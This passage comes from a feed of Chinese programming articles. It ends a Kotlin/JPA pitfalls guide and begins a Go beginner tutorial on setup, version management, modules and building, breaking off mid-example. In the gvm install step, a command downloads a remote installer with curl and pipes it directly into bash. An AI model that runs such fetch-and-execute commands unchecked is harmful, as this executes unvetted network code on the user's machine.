<p><strong>残酷的现实</strong>：如果数据库里 <code>name</code> 字段是 <code>NULL</code>，JPA 会通过反射直接把 <code>null</code> 塞进去，完全绕过 Kotlin 的空检查。</p>
<p>当你后续访问 <code>product.name</code> 时，会得到一个<strong>表面是 <code>String</code>，实际是 <code>null</code></strong> 的值，导致 NPE。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>数据库层面加 <code>NOT NULL</code> 约束</li>
<li>代码层面对可能为空的字段使用 <code>String?</code></li>
<li>不要盲目信任 Kotlin 的类型系统</li>
</ol>
<hr/>
<h2 data-id="heading-6">陷阱五：默认值在查询时不生效</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {
    <span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
    <span class="hljs-keyword">var</span> id: <span class="hljs-built_in">Long</span>? = <span class="hljs-literal">null</span>

    <span class="hljs-keyword">var</span> status: String = <span class="hljs-string">"PENDING"</span>  <span class="hljs-comment">// 期望新建时默认为 PENDING</span>
}
</code></pre>
<p><strong>新建实体时</strong>：默认值生效，<code>status = "PENDING"</code> ✅</p>
<p><strong>从数据库查询时</strong>：JPA 用反射直接赋值，<strong>完全忽略默认值</strong> ❌</p>
<p>这意味着如果数据库里 <code>status</code> 是 <code>NULL</code>，查出来就是 <code>null</code>，而不是 <code>"PENDING"</code>。</p>
<hr/>
<h2 data-id="heading-7">终极解决方案：编译器插件</h2>
<p>手动处理这些问题太繁琐，Kotlin 提供了官方插件：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build.gradle.kts</span>
plugins {
    kotlin(<span class="hljs-string">"plugin.spring"</span>) version <span class="hljs-string">"2.1.0"</span>  <span class="hljs-comment">// 自动 open</span>
    kotlin(<span class="hljs-string">"plugin.jpa"</span>) version <span class="hljs-string">"2.1.0"</span>     <span class="hljs-comment">// 自动生成无参构造</span>
}
</code></pre>
<p><strong>plugin.jpa</strong> 会为标注了 <code>@Entity</code>、<code>@Embeddable</code>、<code>@MappedSuperclass</code> 的类自动生成无参构造函数。</p>
<p><strong>plugin.spring</strong>（或 all-open）会自动把相关类变成非 final。</p>
<hr/>
<h2 data-id="heading-8">最佳实践模板</h2>
<p>结合以上所有经验，这是我推荐的 Kotlin JPA 实体写法：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = <span class="hljs-string">"companies"</span>)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">var</span> id: <span class="hljs-built_in">Long</span>? = <span class="hljs-literal">null</span>

    <span class="hljs-meta">@Column(nullable = false)</span>
    <span class="hljs-keyword">var</span> name: String = <span class="hljs-string">""</span>

    <span class="hljs-meta">@Column(nullable = false)</span>
    <span class="hljs-keyword">var</span> email: String = <span class="hljs-string">""</span>

    <span class="hljs-meta">@Column</span>
    <span class="hljs-keyword">var</span> description: String? = <span class="hljs-literal">null</span>  <span class="hljs-comment">// 可空字段明确标注</span>

    <span class="hljs-meta">@ManyToOne(fetch = FetchType.LAZY)</span>
    <span class="hljs-keyword">var</span> parent: Company? = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// 基于主键的 equals/hashCode</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">equals</span><span class="hljs-params">(other: <span class="hljs-type">Any</span>?)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> === other) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        <span class="hljs-keyword">if</span> (other !<span class="hljs-keyword">is</span> Company) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        <span class="hljs-keyword">return</span> id != <span class="hljs-literal">null</span> &amp;&amp; id == other.id
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> = javaClass.hashCode()
}
</code></pre>
<p><strong>要点</strong>：</p>
<ol>
<li>普通 class，不是 data class</li>
<li>所有属性用 <code>var</code></li>
<li>主键用 <code>Long?</code></li>
<li>可空字段用 <code>?</code> 类型</li>
<li>手动实现基于主键的 <code>equals/hashCode</code></li>
</ol>
<hr/>
<h2 data-id="heading-9">写在最后</h2>
<p>Kotlin 和 JPA 的冲突本质上是<strong>现代语言设计</strong>与<strong>传统 ORM 规范</strong>的碰撞。</p>
<p>JPA 诞生于 2006 年，那时 Java 还没有 <code>record</code>，更没有 Kotlin。它的设计深度依赖反射和可变性——这在当时是合理的，但与 Kotlin 的理念格格不入。</p>
<p>好消息是，JetBrains 在 <strong>IntelliJ IDEA 2026.1</strong> 中增加了 JPA + Kotlin 的专项检查，能自动发现这些问题。</p>
<p>在那之前，记住这个原则：</p>
<blockquote>
<p><strong>在 JPA 的世界里，放下 Kotlin 的「洁癖」，拥抱 <code>var</code> 和 <code>null</code>。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[第2章、从环境搭建到程序运行：第一个 Go 程序之旅]]></title>    <link>https://juejin.cn/post/7597317683051708425</link>    <guid>https://juejin.cn/post/7597317683051708425</guid>    <pubDate>2026-01-21T00:57:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597317683051708425" data-draft-id="7597278451030245386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="第2章、从环境搭建到程序运行：第一个 Go 程序之旅"/> <meta itemprop="keywords" content="后端,Go"/> <meta itemprop="datePublished" content="2026-01-21T00:57:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怕浪猫"/> <meta itemprop="url" content="https://juejin.cn/user/2832784963939438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            第2章、从环境搭建到程序运行：第一个 Go 程序之旅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2832784963939438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怕浪猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:57:19.000Z" title="Wed Jan 21 2026 00:57:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好～ 在上一篇文章里，我们聊了为什么选择Go语言，今天就从最基础的“第一个Go程序”开始，手把手带你走完从环境搭建到代码运行、项目规范的全流程。不管你是零基础的编程新手，还是从其他语言转过来的开发者，这篇文章都能让你快速上手Go的基础开发流程。</p>
<h2 data-id="heading-0">1. 安装Go开发环境与版本管理</h2>
<p>想要写Go程序，第一步当然是把开发环境搭好。这部分我们不仅讲基础安装，还会重点说版本管理——毕竟实际开发中，不同项目可能需要不同版本的Go，学会版本管理能少踩很多坑。</p>
<h3 data-id="heading-1">1.1 基础安装（Windows/Mac/Linux）</h3>
<p>Go的官方安装包适配所有主流系统，步骤简单且统一：</p>
<ol>
<li><strong>下载安装包</strong>：</li>
</ol>
<p>官方下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.dev%2Fdl%2F" target="_blank" title="https://go.dev/dl/" ref="nofollow noopener noreferrer">go.dev/dl/</a>（推荐下载“Stable”稳定版，比如go1.22.x）</p>
<ul>
<li>
<p>Windows：下载<code>.msi</code>文件，双击安装，默认路径<code>C:\Program Files\Go\</code>，安装程序会自动配置环境变量。</p>
</li>
<li>
<p>MacOS：下载<code>.pkg</code>文件双击安装；或用Homebrew一键安装：</p>
<pre><code class="hljs language-Bash" lang="Bash">
brew install go
</code></pre>
</li>
<li>
<p>Linux：下载<code>.tar.gz</code>文件，解压到<code>/usr/local</code>，并配置环境变量：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># 解压</span>
tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
<span class="hljs-comment"># 配置环境变量（写入~/.bashrc或~/.zshrc）</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/go/bin
<span class="hljs-comment"># 生效配置</span>
<span class="hljs-built_in">source</span> ~/.bashrc
</code></pre>
</li>
</ul>
<ol>
<li><strong>验证安装</strong>：</li>
</ol>
<p>打开终端（Windows用CMD/PowerShell，Mac/Linux用Terminal），输入：</p>
<pre><code class="hljs language-Bash" lang="Bash">
go version
</code></pre>
<p>若输出类似<code>go version go1.22.0 darwin/arm64</code>（Mac）或<code>go version go1.22.0 windows/amd64</code>（Windows）的信息，说明安装成功。</p>
<h3 data-id="heading-2">1.2 版本管理（多版本切换）</h3>
<p>实际开发中，比如老项目依赖Go1.20，新项目要用Go1.22，这时候需要版本管理工具，推荐<code>gvm</code>（Go Version Manager）：</p>
<ol>
<li>
<p><strong>安装gvm</strong>（Mac/Linux）：</p>
<pre><code class="hljs language-Bash" lang="Bash">
bash &lt; &lt;(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
</code></pre>
<p>Windows用户可使用<code>gvm-windows</code>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandrewkroh%2Fgvm-windows" target="_blank" title="https://github.com/andrewkroh/gvm-windows" ref="nofollow noopener noreferrer">github.com/andrewkroh/…</a></p>
</li>
<li>
<p><strong>使用gvm管理版本</strong>：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># 安装指定版本</span>
gvm install go1.20.0 -B
gvm install go1.22.0 -B
<span class="hljs-comment"># 切换版本</span>
gvm use go1.20.0 --default  <span class="hljs-comment"># 设置默认版本为1.20</span>
gvm use go1.22.0             <span class="hljs-comment"># 临时切换到1.22</span>
</code></pre>
</li>
<li>
<p><strong>验证版本切换</strong>：</p>
</li>
</ol>
<p>切换后再次执行<code>go version</code>，确认版本号已更新。</p>
<h2 data-id="heading-3">2. 设置GOPATH与模块模式</h2>
<p>Go的项目管理经历了两个阶段：早期的<code>GOPATH</code>模式，和现在主流的<code>Go Modules</code>模式。我们先搞懂这两个概念，避免后续踩坑。</p>
<h3 data-id="heading-4">2.1 什么是GOPATH？</h3>
<p><code>GOPATH</code>是Go早期的工作区目录，默认路径：</p>
<ul>
<li>
<p>Windows：<code>%USERPROFILE%\go</code>（比如<code>C:\Users\你的用户名\go</code>）</p>
</li>
<li>
<p>Mac/Linux：<code>$HOME/go</code>（比如<code>/Users/你的用户名/go</code>）</p>
</li>
</ul>
<p>它包含三个子目录：</p>
<ul>
<li>
<p><code>src</code>：存放Go项目源码</p>
</li>
<li>
<p><code>bin</code>：存放编译后的可执行文件</p>
</li>
<li>
<p><code>pkg</code>：存放编译后的包文件</p>
</li>
</ul>
<h3 data-id="heading-5">2.2 为什么推荐模块模式（Go Modules）？</h3>
<p>早期<code>GOPATH</code>模式有个痛点：所有项目必须放在<code>GOPATH/src</code>下，且无法为不同项目管理不同版本的依赖。Go1.11开始引入<code>Go Modules</code>（模块模式），彻底解决了这个问题——<strong>项目可以放在任意目录</strong>，且能精准管理依赖版本。</p>
<h3 data-id="heading-6">2.3 启用模块模式（无需手动配置GOPATH）</h3>
<p>Go1.16及以上版本，<code>Go Modules</code>已默认启用，无需额外配置。若你的版本较低，可通过环境变量启用：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># 临时启用</span>
<span class="hljs-built_in">export</span> GO111MODULE=on
<span class="hljs-comment"># 永久启用（写入~/.bashrc或~/.zshrc）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"export GO111MODULE=on"</span> &gt;&gt; ~/.bashrc
<span class="hljs-built_in">source</span> ~/.bashrc
</code></pre>
<h3 data-id="heading-7">3. 编写并运行第一个Hello World程序</h3>
<p>环境搭好后，我们来写第一个Go程序，体验从编码到运行的完整流程。</p>
<h4 data-id="heading-8">3.1 步骤1：创建项目目录（任意位置）</h4>
<p>不用局限于<code>GOPATH</code>，比如在桌面创建<code>hello-go</code>目录：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># Mac/Linux</span>
<span class="hljs-built_in">mkdir</span> -p ~/Desktop/hello-go
<span class="hljs-built_in">cd</span> ~/Desktop/hello-go

<span class="hljs-comment"># Windows（PowerShell）</span>
<span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$HOME</span>/Desktop/hello-go
<span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/Desktop/hello-go
</code></pre>
<h3 data-id="heading-9">3.2 步骤2：编写代码</h3>
<p>新建<code>main.go</code>文件（Go源码文件后缀为<code>.go</code>），写入以下代码：</p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-comment">// 声明包名，main包是可执行程序的入口包</span>
<span class="hljs-keyword">package</span> main

<span class="hljs-comment">// 导入标准库的fmt包，用于输入输出</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-comment">// 主函数，程序的入口点，必须是main包下的main函数</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 输出Hello World</span>
    fmt.Println(<span class="hljs-string">"Hello, Go! 👋"</span>)
}
</code></pre>
<h3 data-id="heading-10">3.3 步骤3：运行程序</h3>
<p>在终端进入<code>hello-go</code>目录，执行：</p>
<pre><code class="hljs language-Bash" lang="Bash">
go run main.go
</code></pre>
<p>终端会输出：<code>Hello, Go! 👋</code>，恭喜你，第一个Go程序运行成功！</p>
<h2 data-id="heading-11">4. 使用go run与go build构建程序</h2>
<p><code>go run</code>和<code>go build</code>是Go最常用的两个构建命令，我们来搞懂它们的区别和用法。</p>
<h3 data-id="heading-12">4.1 go run：直接运行（不生成可执行文件）</h3>
<p><code>go run</code>会先编译源码，然后直接运行程序，但不会生成可执行文件，适合开发调试阶段：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># 基本用法</span>
go run main.go

<span class="hljs-comment"># 若有多个源码文件（比如main.go、utils.go）</span>
go run main.go utils.go
</code></pre>
<h3 data-id="heading-13">4.2 go build：编译生成可执行文件</h3>
<p><code>go build</code>会将源码编译成可执行文件，适合部署发布：</p>
<ol>
<li>
<p><strong>基本用法</strong>：</p>
<pre><code class="hljs language-Bash" lang="Bash">
go build main.go
</code></pre>
<p>执行后，目录下会生成可执行文件：</p>
<ul>
<li>
<p>Windows：<code>main.exe</code></p>
</li>
<li>
<p>Mac/Linux：<code>main</code></p>
</li>
</ul>
</li>
<li>
<p><strong>运行可执行文件</strong>：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># Windows</span>
.\main.exe

<span class="hljs-comment"># Mac/Linux</span>
./main
</code></pre>
</li>
<li>
<p><strong>自定义可执行文件名</strong>：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># -o 指定输出文件名</span>
go build -o hello main.go

<span class="hljs-comment"># 运行自定义名称的程序</span>
./hello  <span class="hljs-comment"># Mac/Linux</span>
.\hello.exe  <span class="hljs-comment"># Windows</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-14">4.3 跨平台编译</h3>
<p>Go的一大优势是跨平台编译——在一台机器上编译出其他系统的可执行文件，无需目标系统环境：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># 示例：在Mac上编译Windows 64位程序</span>
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o hello-windows.exe main.go

<span class="hljs-comment"># 示例：在Windows上编译Linux 64位程序（PowerShell）</span>
<span class="hljs-variable">$env</span>:CGO_ENABLED=0
<span class="hljs-variable">$env</span>:GOOS=<span class="hljs-string">"linux"</span>
<span class="hljs-variable">$env</span>:GOARCH=<span class="hljs-string">"amd64"</span>
go build -o hello-linux main.go
</code></pre>
<p>参数说明：</p>
<ul>
<li>
<p><code>CGO_ENABLED=0</code>：禁用CGO（避免跨平台依赖问题）</p>
</li>
<li>
<p><code>GOOS</code>：目标操作系统（windows/linux/darwin（Mac））</p>
</li>
<li>
<p><code>GOARCH</code>：目标架构（amd64/arm64/386）</p>
</li>
</ul>
<h2 data-id="heading-15">5. 程序结构解析：包、导入、主函数</h2>
<p>第一个程序虽然简单，但包含了Go程序的核心结构，我们逐行拆解，理解背后的逻辑。</p>
<h3 data-id="heading-16">5.1 包（Package）</h3>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-keyword">package</span> main
</code></pre>
<ul>
<li>
<p>Go中所有代码都属于某个“包”，包是Go的基本组织单位。</p>
</li>
<li>
<p><code>main</code>包是<strong>特殊包</strong>：只有<code>main</code>包才能生成可执行程序，其他包只能作为库被导入使用。</p>
</li>
<li>
<p>包名通常和目录名一致（但不是强制），比如<code>fmt</code>包对应的目录就是<code>fmt</code>。</p>
</li>
</ul>
<h3 data-id="heading-17">5.2 导入（Import）</h3>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>
</code></pre>
<ul>
<li>
<p><code>import</code>用于导入其他包，使用其中的函数、变量等。</p>
</li>
<li>
<p><code>"fmt"</code>是Go标准库的包，提供格式化输入输出功能。</p>
</li>
<li>
<p>多包导入的两种写法（推荐第二种，更规范）：</p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-comment">// 写法1：多行导入</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"os"</span>

<span class="hljs-comment">// 写法2：分组导入（推荐）</span>
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"os"</span>
)
</code></pre>
</li>
</ul>
<h3 data-id="heading-18">5.3 主函数（main函数）</h3>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    fmt.Println(<span class="hljs-string">"Hello, Go! 👋"</span>)
}
</code></pre>
<ul>
<li>
<p><code>main()</code>函数是程序的<strong>唯一入口</strong>，必须定义在<code>main</code>包下，且没有参数、没有返回值。</p>
</li>
<li>
<p><code>fmt.Println()</code>是<code>fmt</code>包的函数，用于输出一行文本到控制台。</p>
</li>
<li>
<p>函数体必须用<code>{}</code>包裹，且<code>{</code>必须和函数名在同一行（Go的语法规范）。</p>
</li>
</ul>
<h3 data-id="heading-19">5.4 完整结构总结</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Package: 包声明] --&gt; B[Import: 包导入]
    B --&gt; C[Function: 函数定义（main是入口）]
    C --&gt; D[Code: 业务逻辑代码]
</code></pre>
<h2 data-id="heading-20">6. 注释与代码可读性规范</h2>
<p>好的注释和代码规范能让你的代码更易读、易维护，Go有明确的注释规范，我们来学习。</p>
<h3 data-id="heading-21">6.1 Go的注释方式</h3>
<p>Go支持两种注释：单行注释和多行注释，<strong>多行注释仅用于包注释</strong>，单行注释用于代码内注释。</p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-comment">// 单行注释：这是main包，程序入口包</span>
<span class="hljs-keyword">package</span> main

<span class="hljs-comment">/*
多行注释（包注释专用）：
fmt包提供格式化输入输出功能，
是Go标准库的核心包之一。
*/</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-comment">// main函数：程序的入口点</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 输出Hello World</span>
    <span class="hljs-comment">// fmt.Println是打印函数，会自动换行</span>
    fmt.Println(<span class="hljs-string">"Hello, Go! 👋"</span>)
}
</code></pre>
<h3 data-id="heading-22">6.2 代码可读性规范（Go官方推荐）</h3>
<ol>
<li>
<p><strong>包注释</strong>：每个包都要有多行注释，说明包的功能（放在<code>package</code>声明上方）。</p>
</li>
<li>
<p><strong>函数注释</strong>：对外暴露的函数（首字母大写）必须加单行注释，说明功能、参数、返回值。</p>
</li>
<li>
<p><strong>命名规范</strong>：</p>
<ul>
<li>
<p>包名：小写、简洁，无下划线（比如<code>fmt</code>、<code>net/http</code>）。</p>
</li>
<li>
<p>变量/函数名：驼峰命名，对外暴露的首字母大写（<code>UserName</code>），内部使用的首字母小写（<code>userName</code>）。</p>
</li>
<li>
<p>常量名：全大写，下划线分隔（<code>MAX_SIZE</code>）。</p>
</li>
</ul>
</li>
<li>
<p><strong>代码格式</strong>：</p>
<ul>
<li>
<p>使用<code>go fmt</code>命令自动格式化代码（VS Code/Goland会自动执行），保证代码风格统一。</p>
</li>
<li>
<p>每行代码不超过80个字符，过长时换行。</p>
</li>
</ul>
</li>
</ol>
<p>示例：规范的代码注释</p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-comment">// 包注释：hello包提供简单的问候功能</span>
<span class="hljs-keyword">package</span> hello

<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-comment">// Greet 向指定用户发送问候语</span>
<span class="hljs-comment">// 参数：name - 用户名</span>
<span class="hljs-comment">// 返回值：拼接好的问候字符串</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Greet</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
    <span class="hljs-comment">// 拼接字符串，使用fmt.Sprintf格式化</span>
    <span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">"Hello, %s!"</span>, name)
}

<span class="hljs-comment">// 内部函数，首字母小写，无需对外注释</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printGreet</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> {
    fmt.Println(Greet(name))
}
</code></pre>
<h2 data-id="heading-23">7. 使用Go Modules初始化项目</h2>
<p>前面我们提到<code>Go Modules</code>是现在的主流项目管理方式，接下来学习如何用它初始化项目、管理依赖。</p>
<h3 data-id="heading-24">7.1 初始化模块</h3>
<p>进入你的项目目录（比如<code>hello-go</code>），执行：</p>
<pre><code class="hljs language-Bash" lang="Bash">
go mod init github.com/你的用户名/hello-go
</code></pre>
<ul>
<li>
<p><code>github.com/你的用户名/hello-go</code>是<strong>模块路径</strong>（可以是任意字符串，推荐用GitHub仓库地址，方便后续发布）。</p>
</li>
<li>
<p>执行后会生成<code>go.mod</code>文件，这是模块的核心配置文件，记录模块路径和Go版本：</p>
<pre><code class="hljs language-Plain" lang="Plain">
module github.com/你的用户名/hello-go

go 1.22
</code></pre>
</li>
</ul>
<h3 data-id="heading-25">7.2 添加依赖</h3>
<p>比如我们要使用第三方库<code>github.com/gin-gonic/gin</code>（高性能Web框架），直接在代码中导入，然后执行<code>go mod tidy</code>即可自动下载依赖：</p>
<ol>
<li>
<p>修改<code>main.go</code>：</p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    fmt.Println(<span class="hljs-string">"Hello, Go! 👋"</span>)
    <span class="hljs-comment">// 初始化gin引擎</span>
    r := gin.Default()
    r.GET(<span class="hljs-string">"/"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {
